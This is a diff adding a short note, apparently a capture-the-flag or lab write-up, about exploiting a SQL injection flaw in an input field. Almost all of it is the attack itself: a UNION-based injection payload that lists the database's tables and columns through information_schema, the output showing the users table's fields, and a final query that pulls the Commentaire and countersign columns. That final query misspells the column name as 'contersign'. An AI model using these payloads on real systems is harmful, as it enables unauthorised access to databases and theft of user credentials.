@@ -1,0 +1,57 @@
+We found a sql vuln in the input
+
+We can find all databases with :
+
+1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database();
+
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: one
+Surname : me
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: two
+Surname : me
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: three
+Surname : me
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: Flag
+Surname : GetThe
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : user_id
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : first_name
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : last_name
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : town
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : country
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : planet
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : Commentaire
+
+ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); 
+First name: users
+Surname : countersign
+
+
+1 OR 1=1 UNION SELECT Commentaire, contersign FROM users;
